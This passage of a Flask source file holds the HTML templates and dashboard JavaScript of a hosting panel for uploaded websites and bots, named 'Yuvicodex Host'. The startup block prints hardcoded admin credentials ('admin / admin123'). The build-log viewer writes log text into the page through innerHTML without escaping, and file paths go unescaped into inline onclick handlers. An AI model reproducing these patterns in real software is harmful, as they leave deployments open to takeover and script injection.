</head><body><div class="card"><h1>{{ message }}</h1><p>Slug: {{ slug }}</p><a href="/dashboard">← Dashboard</a></div></body></html>"""

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Login</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.06);padding:40px;border-radius:20px;width:320px;text-align:center}input{width:100%;padding:10px;margin:8px 0;background:#1a1a2e;border:1px solid #333;border-radius:8px;color:#fff}.btn{width:100%;padding:10px;background:#00e5ff;border:none;border-radius:8px;color:#000;font-weight:bold;cursor:pointer}.error{color:#ff4757}.link{color:#00e5ff;text-decoration:none}</style>
</head><body><div class="card"><h2>Login</h2>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Login</button>
</form>
<div class="error">{{ error }}</div>
<a class="link" href="/register">Register</a>
</div></body></html>
"""

REGISTER_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Register</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;display:flex;justify-content:center;align-items:center;height:100vh}.card{background:rgba(255,255,255,0.06);padding:40px;border-radius:20px;width:320px;text-align:center}input{width:100%;padding:10px;margin:8px 0;background:#1a1a2e;border:1px solid #333;border-radius:8px;color:#fff}.btn{width:100%;padding:10px;background:#7a00ff;border:none;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer}.error{color:#ff4757}.link{color:#00e5ff;text-decoration:none}</style>
</head><body><div class="card"><h2>Register</h2>
<form method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button class="btn" type="submit">Register</button>
</form>
<div class="error">{{ error }}</div>
<a class="link" href="/">Login</a>
</div></body></html>
"""

# =========================================================================
# ========================== DASHBOARD TEMPLATE ============================
# =========================================================================
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Dashboard - Yuvicodex</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#0a0e1a 0%,#0d1a2a 100%);color:#fff;font-family:'Segoe UI',sans-serif;padding:20px;min-height:100vh}
.container{max-width:1400px;margin:auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 25px;background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border-radius:20px;border:1px solid rgba(255,255,255,0.08);margin-bottom:30px;flex-wrap:wrap;gap:10px}
.header h1{font-size:1.8rem;background:linear-gradient(135deg,#00e5ff,#7a00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.user-badge{display:flex;align-items:center;gap:15px;flex-wrap:wrap}
.badge{background:rgba(0,229,255,0.15);padding:4px 14px;border-radius:50px;font-size:0.8rem;border:1px solid rgba(0,229,255,0.2)}
.plan-badge{background:linear-gradient(135deg,#7a00ff,#00e5ff);padding:2px 12px;border-radius:50px;font-size:0.7rem;font-weight:700}
.btn-logout{color:#ff4757;text-decoration:none;font-weight:600;padding:8px 20px;border:1px solid #ff4757;border-radius:50px;transition:.3s}
.btn-logout:hover{background:#ff4757;color:#fff}
.stats-btn{background:rgba(0,229,255,0.15);border:1px solid #00e5ff;color:#00e5ff;padding:8px 20px;border-radius:50px;cursor:pointer;transition:.3s;font-weight:600}
.stats-btn:hover{background:#00e5ff;color:#000}
.tabs{display:flex;gap:10px;margin-bottom:20px;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:10px}
.tab-btn{background:transparent;border:none;color:#888;font-size:1.2rem;font-weight:700;padding:10px 20px;cursor:pointer;transition:.3s;border-radius:10px}
.tab-btn:hover{color:#fff;background:rgba(255,255,255,0.05)}
.tab-btn.active{color:#00e5ff;background:rgba(0,229,255,0.1)}
.tab-content{display:none}
.tab-content.active{display:block}
.upload-box{background:rgba(255,255,255,0.04);backdrop-filter:blur(10px);border:2px dashed rgba(255,255,255,0.2);border-radius:25px;padding:30px;margin-bottom:30px;transition:.3s;position:relative}
.upload-box.dragover{border-color:#00e5ff;background:rgba(0,229,255,0.05)}
.upload-box:hover{border-color:#00e5ff}
.upload-box h3{font-size:1.3rem;margin-bottom:15px;color:#ddd}
.upload-box input[type="file"]{width:100%;padding:10px;margin:8px 0;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:15px;color:#fff;outline:none}
.btn{background:linear-gradient(135deg,#7a00ff,#00e5ff);border:none;padding:12px 40px;border-radius:50px;color:#fff;font-size:1rem;font-weight:700;cursor:pointer;transition:.3s}
.btn:hover{transform:scale(1.05);box-shadow:0 0 40px rgba(0,229,255,0.2)}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:25px;margin-top:20px}
.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.07);border-radius:20px;padding:25px;transition:.3s}
.card:hover{transform:translateY(-5px);border-color:rgba(0,229,255,0.2)}
.card-title{font-size:1.2rem;font-weight:700;color:#fff}
.card-slug{color:#889;font-size:0.9rem;margin:5px 0}
.card-port{color:#889;font-size:0.8rem}
.status-badge{display:inline-block;padding:4px 14px;border-radius:50px;font-size:0.75rem;font-weight:600;margin:10px 0}
.status-running{background:rgba(0,229,255,0.15);color:#00e5ff;border:1px solid rgba(0,229,255,0.2)}
.status-stopped{background:rgba(255,71,87,0.15);color:#ff4757;border:1px solid rgba(255,71,87,0.2)}
.status-uploaded{background:rgba(255,170,0,0.15);color:#ffaa00;border:1px solid rgba(255,170,0,0.2)}
.status-failed{background:rgba(255,0,0,0.15);color:#ff0000;border:1px solid rgba(255,0,0,0.2)}
.card-meta{color:#666;font-size:0.8rem;margin:8px 0}
.visit-link{display:inline-block;padding:8px 20px;border-radius:50px;background:#00e5ff;color:#000;text-decoration:none;font-weight:700;font-size:0.9rem;transition:.3s;margin:10px 0}
.visit-link:hover{transform:scale(1.05);box-shadow:0 0 30px rgba(0,229,255,0.3)}
.actions{display:flex;flex-wrap:wrap;gap:8px;margin-top:15px}
.actions button{padding:6px 14px;border:none;border-radius:12px;font-size:0.8rem;font-weight:600;cursor:pointer;transition:.2s}
.actions button:hover{transform:scale(1.05)}
.btn-start{background:rgba(0,229,255,0.2);color:#00e5ff}
.btn-start:hover{background:#00e5ff;color:#000}
.btn-stop{background:rgba(255,71,87,0.2);color:#ff4757}
.btn-stop:hover{background:#ff4757;color:#fff}
.btn-restart{background:rgba(255,170,0,0.2);color:#ffaa00}
.btn-restart:hover{background:#ffaa00;color:#000}
.btn-manage{background:rgba(255,255,255,0.08);color:#aaa}
.btn-manage:hover{background:rgba(255,255,255,0.15);color:#fff}
.btn-delete{background:rgba(255,0,0,0.15);color:#ff4444}
.btn-delete:hover{background:#ff0000;color:#fff}
.btn-edit{background:rgba(77,136,255,0.2);color:#4d88ff}
.btn-edit:hover{background:#4d88ff;color:#fff}
.btn-download{background:rgba(46,204,113,0.2);color:#2ecc71}
.btn-download:hover{background:#2ecc71;color:#fff}
.btn-openbot{background:rgba(29,161,242,0.2);color:#1da1f2}
.btn-openbot:hover{background:#1da1f2;color:#fff}
.name-edit{display:flex;gap:8px;margin-top:12px}
.name-edit input{flex:1;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;outline:none;font-size:0.85rem}
.name-edit input:focus{border-color:#00e5ff}
.name-edit button{padding:8px 16px;background:#00e5ff;border:none;border-radius:12px;color:#000;font-weight:600;cursor:pointer}
.console{background:#0d0d0d;border-radius:12px;padding:15px;max-height:200px;overflow-y:auto;font-family:monospace;font-size:13px;color:#0f0;border:1px solid rgba(255,255,255,0.05);margin-top:15px}
.log-container{display:none;margin:20px 0;background:#0d0d0d;border-radius:15px;padding:15px;border:1px solid rgba(255,255,255,0.1);max-height:400px;overflow-y:auto;font-family:'Courier New',monospace;font-size:13px;color:#aab}
.log-container .line{margin:0;white-space:pre-wrap}
.log-container .line.SYSTEM{color:#00e5ff}
.log-container .line.SUCCESS{color:#00ff88}
.log-container .line.ERROR{color:#ff4757}
.log-container .line.PROCESS{color:#9ca3af}
@media(max-width:600px){.header{flex-direction:column;gap:10px;text-align:center}.grid{grid-template-columns:1fr}}
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;justify-content:center;align-items:center}
.modal-overlay.open{display:flex}
.modal{background:#0c1018;border:1px solid rgba(255,255,255,0.1);border-radius:25px;padding:30px;max-width:800px;width:90%;max-height:90vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,0.8);position:relative}
.modal-close{position:absolute;top:15px;right:20px;background:none;border:none;color:#ff4757;font-size:28px;cursor:pointer}
.modal h2{color:#00e5ff;margin-bottom:20px}
.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px}
.stat-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:15px;padding:15px;text-align:center}
.stat-card .label{color:#888;font-size:0.8rem;text-transform:uppercase;letter-spacing:1px}
.stat-card .value{font-size:1.6rem;font-weight:bold;color:#00e5ff;margin:5px 0}
.stat-card .sub{color:#666;font-size:0.8rem}
.stat-card .progress-bar{width:100%;height:6px;background:#1a1a1a;border-radius:4px;margin-top:8px;overflow:hidden}
.stat-card .progress-bar .fill{height:100%;background:linear-gradient(90deg,#7a00ff,#00e5ff);border-radius:4px;transition:width 0.5s}
@media(max-width:600px){.stats-grid{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🚀 Yuvicodex Host</h1>
<div class="user-badge">
<span class="badge">{{ user }}</span>
<span class="plan-badge">{{ plan.upper() }}</span>
{% if role == 'admin' %}
<button class="stats-btn" id="statsBtn">⚙️ System Stats</button>
{% endif %}
<a href="/logout" class="btn-logout">Logout</a>
</div>
</div>

<div class="tabs">
<button class="tab-btn active" data-tab="websites">🌐 Websites</button>
<button class="tab-btn" data-tab="bots">🤖 Bots</button>
</div>

<!-- WEBSITES TAB -->
<div id="tab-websites" class="tab-content active">
<div class="upload-box" id="dropZoneWebsite">
<h3>📤 Upload Website (ZIP or individual files)</h3>
<p style="color:#889;font-size:0.9rem;margin-bottom:10px;">Drag & drop or click to select</p>
<input type="file" id="websiteFileInput" multiple accept=".zip,.py,.txt,.html,.js,.css,application/zip">
<button class="btn" id="websiteUploadBtn" style="margin-top:10px;">Upload & Deploy</button>
<div id="websiteUploadStatus"></div>
</div>
<div id="websiteGrid" class="grid">
{% for w in websites %}
<div class="card" data-id="{{ w.id }}">
<div class="card-title">{{ w.website_name or w.website_slug }}</div>
<div class="card-slug">🔗 {{ base_url }}/<strong>{{ w.website_slug }}</strong>/</div>
<div class="card-port">Port: {{ w.allocated_port or 'Not allocated' }}</div>
<div class="status-badge status-{{ w.status }}">{{ w.status.upper() }}</div>
<div class="card-meta">Created: {{ w.created_at[:10] }} | Size: {{ (w.storage_used or 0)//1024 }} KB</div>
{% if w.status == 'running' %}
<a href="{{ base_url }}/{{ w.website_slug }}/" target="_blank" class="visit-link">🌐 Visit Site</a>
{% endif %}
<div class="actions">
<button class="btn-start" onclick="action({{ w.id }},'start')">▶ Start</button>
<button class="btn-stop" onclick="action({{ w.id }},'stop')">■ Stop</button>
<button class="btn-restart" onclick="action({{ w.id }},'restart')">⟳ Restart</button>
<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/files'">📁 Files</button>
<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/logs'">📜 Logs</button>
<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/deployments'">📋 Deployments</button>
<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/build'">🖥 Build Logs</button>
<button class="btn-delete" onclick="if(confirm('Delete this website?')) action({{ w.id }},'delete')">🗑 Delete</button>
</div>
<div class="name-edit">
<input type="text" id="name_input_{{ w.id }}" value="{{ w.website_name or '' }}" placeholder="Website Name">
<button onclick="renameWebsite({{ w.id }})">Rename</button>
</div>
</div>
{% else %}
<div class="empty-msg" style="grid-column:1/-1;text-align:center;color:#555;padding:40px;">No websites uploaded yet.</div>
{% endfor %}
</div>
<div class="log-container" id="websiteLogContainer"><div id="websiteLogContent"></div></div>
</div>

<!-- BOTS TAB -->
<div id="tab-bots" class="tab-content">
<div class="upload-box" id="dropZoneBot">
<h3>🤖 Upload Bot (ZIP or individual files)</h3>
<p style="color:#889;font-size:0.9rem;margin-bottom:10px;">Drag & drop or click to select</p>
<input type="file" id="botFileInput" multiple accept=".zip,.py,.js,.go,.rb,.php,.sh,.pl">
<button class="btn" id="botUploadBtn" style="margin-top:10px;">Upload & Deploy</button>
<div id="botUploadStatus"></div>
</div>
<div id="botGrid" class="grid">
{% for b in bots %}
<div class="card" data-id="{{ b.id }}">
<div class="card-title">{{ b.website_name or b.startup_file or 'Bot' }}</div>
<div class="card-slug">🔗 Slug: {{ b.website_slug }}</div>
<div class="card-port">PID: {{ b.pid or '—' }}</div>
<div class="status-badge status-{{ b.status }}">{{ b.status.upper() }}</div>
<div class="card-meta">Created: {{ b.created_at[:10] }} | Runtime: {{ (b.total_runtime_seconds or 0)//3600 }}h</div>
<div class="actions">
<button class="btn-start" onclick="action({{ b.id }},'start')">▶ Start</button>
<button class="btn-stop" onclick="action({{ b.id }},'stop')">■ Stop</button>
<button class="btn-restart" onclick="action({{ b.id }},'restart')">⟳ Restart</button>
<button class="btn-edit" onclick="editBot({{ b.id }})">✎ Edit</button>
<button class="btn-download" onclick="downloadBot({{ b.id }})">⬇ Download</button>
<button class="btn-manage" onclick="location.href='/website/{{ b.id }}/logs'">📜 Logs</button>
<button class="btn-manage" onclick="location.href='/website/{{ b.id }}/build'">🖥 Build Logs</button>
<button class="btn-delete" onclick="if(confirm('Delete this bot?')) action({{ b.id }},'delete')">🗑 Delete</button>
</div>
<div class="name-edit">
<input type="text" id="name_input_{{ b.id }}" value="{{ b.website_name or '' }}" placeholder="Bot Name">
<button onclick="renameWebsite({{ b.id }})">Rename</button>
</div>
</div>
{% else %}
<div class="empty-msg" style="grid-column:1/-1;text-align:center;color:#555;padding:40px;">No bots uploaded yet.</div>
{% endfor %}
</div>
<div class="console" id="botConsole">Select a bot to see logs.</div>
</div>

</div>

<!-- Stats Modal -->
<div class="modal-overlay" id="statsModal">
<div class="modal">
<button class="modal-close" id="statsModalClose">&times;</button>
<h2>📊 System Statistics (Owner)</h2>
<div class="stats-grid" id="statsGrid">
<div class="stat-card"><div class="label">Total Hours Used (All)</div><div class="value" id="statTotalHours">--</div><div class="sub">Offset + Running</div></div>
<div class="stat-card"><div class="label">Main Container Uptime</div><div class="value" id="statMainHours">--</div><div class="sub">Flask App</div></div>
<div class="stat-card"><div class="label">Internal Sites/Bots</div><div class="value" id="statInternalHours">--</div><div class="sub">Subprocesses</div></div>
<div class="stat-card"><div class="label">Render External Services</div><div class="value" id="statRenderHours">--</div><div class="sub">Active: <span id="statRenderActive">--</span></div></div>
<div class="stat-card"><div class="label">Storage (Uploads)</div><div class="value" id="statStorage">--</div><div class="sub">Free: <span id="statDiskFree">--</span> GB</div></div>
<div class="stat-card"><div class="label">Container RAM</div><div class="value" id="statRam">--</div><div class="sub"><span id="statRamUsed">--</span> MB / <span id="statRamTotal">--</span> MB</div><div class="progress-bar"><div class="fill" id="ramFill" style="width:0%;"></div></div></div>
<div class="stat-card"><div class="label">CPU Usage</div><div class="value" id="statCpu">--</div><div class="sub">Percent</div></div>
</div>
<div style="margin-top:15px;border-top:1px solid rgba(255,255,255,0.1);padding-top:15px;">
<label style="color:#aaa;">🔧 Set Offset (Total Hours from Render Dashboard)</label>
<div style="display:flex;gap:10px;margin-top:5px;">
<input type="number" id="offsetInput" step="0.01" placeholder="e.g. 52.30" style="flex:1;background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:10px;color:#fff;">
<button id="setOffsetBtn" style="background:#00e5ff;border:none;border-radius:8px;padding:10px 20px;color:#000;font-weight:700;cursor:pointer;">SET OFFSET</button>
</div>
<div style="font-size:0.75rem;color:#666;margin-top:5px;">Render Dashboard → Usage → Total Hours Used so far.</div>
</div>
</div>
</div>

<script>
// Tab switching
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', function() {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        this.classList.add('active');
        document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
        document.getElementById('tab-' + this.dataset.tab).classList.add('active');
        if (this.dataset.tab === 'websites') { /* nothing extra */ }
        else if (this.dataset.tab === 'bots') { /* nothing */ }
    });
});

// Drag and Drop for Websites
const dropZoneW = document.getElementById('dropZoneWebsite');
dropZoneW.addEventListener('dragover', (e) => { e.preventDefault(); dropZoneW.classList.add('dragover'); });
dropZoneW.addEventListener('dragleave', () => dropZoneW.classList.remove('dragover'));
dropZoneW.addEventListener('drop', (e) => {
    e.preventDefault(); dropZoneW.classList.remove('dragover');
    const input = document.getElementById('websiteFileInput');
    const dt = new DataTransfer();
    for (let f of e.dataTransfer.files) dt.items.add(f);
    input.files = dt.files;
});

// Drag and Drop for Bots
const dropZoneB = document.getElementById('dropZoneBot');
dropZoneB.addEventListener('dragover', (e) => { e.preventDefault(); dropZoneB.classList.add('dragover'); });
dropZoneB.addEventListener('dragleave', () => dropZoneB.classList.remove('dragover'));
dropZoneB.addEventListener('drop', (e) => {
    e.preventDefault(); dropZoneB.classList.remove('dragover');
    const input = document.getElementById('botFileInput');
    const dt = new DataTransfer();
    for (let f of e.dataTransfer.files) dt.items.add(f);
    input.files = dt.files;
});

function escapeHtml(s) {
    const d = document.createElement('div');
    d.textContent = s; return d.innerHTML;
}

function formatUptime(sec) {
    if (!sec || sec < 0) return '--';
    const d = Math.floor(sec / 86400);
    const h = Math.floor((sec % 86400) / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const s = Math.floor(sec % 60);
    return `${d}d ${h}h ${m}m ${s}s`;
}

// Actions for website/bot
function action(id, type) {
    if (!confirm('Are you sure?')) return;
    fetch('/api/website/' + id + '/' + type, { method: 'POST' })
    .then(r => r.json())
    .then(d => { if (d.success) location.reload(); else alert('Error: ' + d.error); })
    .catch(() => alert('Network error'));
}

function renameWebsite(id) {
    const val = document.getElementById('name_input_' + id).value.trim();
    if (!val) return alert('Enter a name');
    fetch('/api/website/' + id + '/rename', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'name=' + encodeURIComponent(val)
    })
    .then(r => r.json())
    .then(d => { if (d.success) location.reload(); else alert('Error: ' + d.error); });
}

function downloadBot(id) {
    window.open('/api/website/' + id + '/download', '_blank');
}

function editBot(id) {
    fetch('/api/website/' + id + '/content')
    .then(r => r.json())
    .then(data => {
        const content = data.content || '';
        const newContent = prompt('Edit file content:', content);
        if (newContent !== null) {
            fetch('/api/website/' + id + '/content', {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: newContent })
            })
            .then(r => r.json())
            .then(d => { if (d.success) location.reload(); else alert('Error: ' + d.error); });
        }
    });
}

// Upload Website
document.getElementById('websiteUploadBtn').onclick = function() {
    const files = document.getElementById('websiteFileInput').files;
    if (!files.length) return alert('Select files');
    const fd = new FormData();
    for (let f of files) fd.append('files[]', f);
    fd.append('type', 'website');
    const st = document.getElementById('websiteUploadStatus');
    st.innerHTML = '⏳ Uploading...';
    fetch('/upload', { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
        if (d.success) { st.innerHTML = '✅ Uploaded!'; showBuildLogs(d.website_id, 'website'); }
        else st.innerHTML = '❌ ' + d.error;
    })
    .catch(() => st.innerHTML = '❌ Network error');
};

// Upload Bot
document.getElementById('botUploadBtn').onclick = function() {
    const files = document.getElementById('botFileInput').files;
    if (!files.length) return alert('Select files');
    const fd = new FormData();
    for (let f of files) fd.append('files[]', f);
    fd.append('type', 'bot');
    const st = document.getElementById('botUploadStatus');
    st.innerHTML = '⏳ Uploading...';
    fetch('/upload', { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
        if (d.success) { st.innerHTML = '✅ Uploaded!'; showBuildLogs(d.website_id, 'bot'); }
        else st.innerHTML = '❌ ' + d.error;
    })
    .catch(() => st.innerHTML = '❌ Network error');
};

// Build Logs
let currentLogSource = null;
function showBuildLogs(websiteId, type) {
    const containerId = (type === 'website') ? 'websiteLogContainer' : 'botLogContainer';
    const container = document.getElementById(containerId);
    if (!container) return;
    container.style.display = 'block';
    container.innerHTML = '<div id="logContent"></div>';
    const logContent = document.getElementById('logContent');
    if (currentLogSource) currentLogSource.close();
    const evt = new EventSource('/deploy/' + websiteId + '/logs');
    currentLogSource = evt;
    evt.onmessage = function(e) {
        const data = e.data;
        if (data === '[REFRESH]') { location.reload(); return; }
        const line = document.createElement('div');
        line.className = 'line';
        const match = data.match(/^\[(\d{2}:\d{2}:\d{2})\] \[([A-Z]+)\] (.*)$/);
        if (match) {
            const [, ts, step, msg] = match;
            line.innerHTML = `<span style="color:#666">[${ts}]</span> <span style="color:#888">[${step}]</span> ${msg}`;
            line.classList.add(step);
        } else {
            line.textContent = data;
        }
        logContent.appendChild(line);
        container.scrollTop = container.scrollHeight;
        if (data.includes('Deployment completed with status:')) {
            setTimeout(() => { location.reload(); }, 2000);
        }
    };
    evt.onerror = function() {};
}

// Stats Modal
{% if role == 'admin' %}
const statsBtn = document.getElementById('statsBtn');
const statsModal = document.getElementById('statsModal');
const statsModalClose = document.getElementById('statsModalClose');
let statsInterval = null;

statsBtn.onclick = function() {
    statsModal.classList.add('open');
    fetchStats();
    if (statsInterval) clearInterval(statsInterval);
    statsInterval = setInterval(fetchStats, 5000);
};
statsModalClose.onclick = function() { statsModal.classList.remove('open'); if (statsInterval) clearInterval(statsInterval); };
statsModal.onclick = function(e) { if (e.target === this) { statsModal.classList.remove('open'); if (statsInterval) clearInterval(statsInterval); } };

function fetchStats() {
    fetch('/api/stats')
    .then(r => r.json())
    .then(data => {
        document.getElementById('statTotalHours').textContent = data.total_hours + ' hrs';
        document.getElementById('statMainHours').textContent = data.main_hours + ' hrs';
        document.getElementById('statInternalHours').textContent = data.internal_hours + ' hrs';
        document.getElementById('statRenderHours').textContent = data.render_running_hours + ' hrs';
        document.getElementById('statRenderActive').textContent = data.render_active_count;
        document.getElementById('statStorage').textContent = data.storage_used_gb + ' GB';
        document.getElementById('statDiskFree').textContent = data.disk_free_gb;
        document.getElementById('statRam').textContent = data.ram.percent + '%';
        document.getElementById('statRamUsed').textContent = data.ram.used_mb;
        document.getElementById('statRamTotal').textContent = data.ram.total_mb;
        document.getElementById('ramFill').style.width = Math.min(data.ram.percent, 100) + '%';
        document.getElementById('statCpu').textContent = data.cpu_percent + '%';
    });
}

document.getElementById('setOffsetBtn').onclick = function() {
    const val = parseFloat(document.getElementById('offsetInput').value);
    if (isNaN(val)) return alert('Enter valid number');
    fetch('/api/set_offset', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ offset: val })
    })
    .then(r => r.json())
    .then(d => {
        if (d.success) { alert('Offset set to ' + val + ' hrs'); fetchStats(); }
        else alert('Error: ' + d.error);
    });
};
{% endif %}
</script>
</body>
</html>
"""

# ---------- OTHER TEMPLATES (simple) ----------
FILES_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Files</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:1000px;margin:auto}.back{color:#00e5ff;text-decoration:none}.upload-area{margin:15px 0;padding:20px;border:2px dashed rgba(255,255,255,0.2);border-radius:15px;text-align:center}ul{list-style:none}li{display:flex;justify-content:space-between;padding:10px 15px;border-bottom:1px solid rgba(255,255,255,0.05)}a{color:#00e5ff;text-decoration:none}.actions button{background:rgba(255,255,255,0.05);border:none;color:#aaa;padding:4px 10px;border-radius:8px;cursor:pointer}</style>
</head><body><div class="container"><a href="/dashboard" class="back">← Dashboard</a><h2>{{ website.website_name or website.website_slug }}</h2>
<div class="upload-area"><input type="file" id="fileUpload" multiple><button onclick="uploadFile({{ website.id }})">Upload</button></div>
<ul>{% for item in items %}<li><span>{% if item.is_dir %}📁 {% else %}📄 {% endif %}<a href="?path={{ item.path }}">{{ item.name }}</a></span><span class="actions">{% if not item.is_dir %}<a href="/website/{{ website.id }}/edit?path={{ item.path }}">✏️</a><a href="/website/{{ website.id }}/file/download?path={{ item.path }}">⬇️</a>{% endif %}<button onclick="deleteFile({{ website.id }},'{{ item.path }}')">🗑</button></span></li>{% endfor %}</ul>
<script>
function uploadFile(id){const f=document.getElementById('fileUpload').files;if(!f.length)return;const fd=new FormData();for(let i=0;i<f.length;i++)fd.append('file',f[i]);const p=new URLSearchParams(window.location.search).get('path')||'';fd.append('path',p);fetch('/website/'+id+'/file/upload',{method:'POST',body:fd}).then(()=>location.reload())}
function deleteFile(id,p){if(!confirm('Delete?'))return;fetch('/website/'+id+'/file/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p})}).then(()=>location.reload())}
</script></body></html>
"""

EDIT_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Edit</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:900px;margin:auto}textarea{width:100%;height:400px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:15px;color:#fff;padding:15px;font-family:monospace;outline:none}.save{background:#00e5ff;border:none;padding:12px 30px;border-radius:50px;color:#000;font-weight:700;cursor:pointer}</style>
</head><body><div class="container"><a href="/website/{{ website.id }}/files">← Back</a><h2>{{ file_path }}</h2><form method="POST"><textarea name="content">{{ content }}</textarea><button class="save" type="submit">Save</button></form></div></body></html>
"""

LOGS_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Logs</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:1000px;margin:auto}.tabs{display:flex;gap:10px;margin:15px 0}.tab{background:rgba(255,255,255,0.05);padding:8px 18px;border-radius:50px;cursor:pointer}.tab.active{background:rgba(0,229,255,0.2);color:#00e5ff}.tab-content{display:none}.tab-content.active{display:block}pre{background:rgba(0,0,0,0.4);padding:15px;border-radius:15px;max-height:400px;overflow-y:auto;font-family:monospace;color:#aab}</style>
</head><body><div class="container"><a href="/dashboard">← Dashboard</a><h2>{{ website.website_name }}</h2>
<div class="tabs"><div class="tab active" data-target="deploy">Deploy</div><div class="tab" data-target="runtime">Runtime</div><div class="tab" data-target="error">Errors</div></div>
<div id="deploy" class="tab-content active"><pre>{{ deploy_log }}</pre></div>
<div id="runtime" class="tab-content"><pre>{{ file_log }}</pre></div>
<div id="error" class="tab-content"><pre>{{ error_log_text }}</pre></div>
<script>document.querySelectorAll('.tab').forEach(t=>t.onclick=function(){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));this.classList.add('active');document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));document.getElementById(this.dataset.target).classList.add('active');});</script></body></html>
"""

BUILD_LOGS_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Build Logs</title>
<style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
</head><body><div class="top-bar"><h2>Build Logs</h2><a href="/dashboard">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">{% if no_logs %}No deployment logs.{% endif %}</div></div>
<script>
const evt = new EventSource('/deploy/{{ website.id }}/logs');
evt.onmessage = function(e) {
    if (e.data === '[REFRESH]') { location.reload(); return; }
    const div = document.createElement('div');
    div.textContent = e.data;
    document.getElementById('logContainer').appendChild(div);
    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
};
</script></body></html>
"""

DEPLOYMENTS_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>Deployments</title>
<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}table{width:100%;border-collapse:collapse}th,td{padding:10px;border-bottom:1px solid rgba(255,255,255,0.05)}</style>
</head><body><div class="container"><a href="/dashboard">← Dashboard</a><h2>Deployments</h2>
<table><tr><th>#</th><th>Repo</th><th>Status</th><th>Started</th></tr>{% for d in deployments %}<tr><td>{{ d.id }}</td><td>{{ d.repo_url or 'ZIP' }}</td><td>{{ d.status }}</td><td>{{ d.started_at }}</td></tr>{% endfor %}</table></div></body></html>
"""

# ---------- MAIN START ----------
MAIN_START_TIME = int(time.time())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("🚀 YUVICODEX ULTIMATE HOST (Websites + Bots + Stats)")
    print(f"🌐 Port: {port}")
    print("👤 Admin: admin / admin123")
    print("📊 Stats: Owner only. Set Offset from Render Dashboard.")
    print("📁 Upload folders: websites and bots both supported.")
    print("="*60)
    app.run(host='0.0.0.0', port=port, debug=False)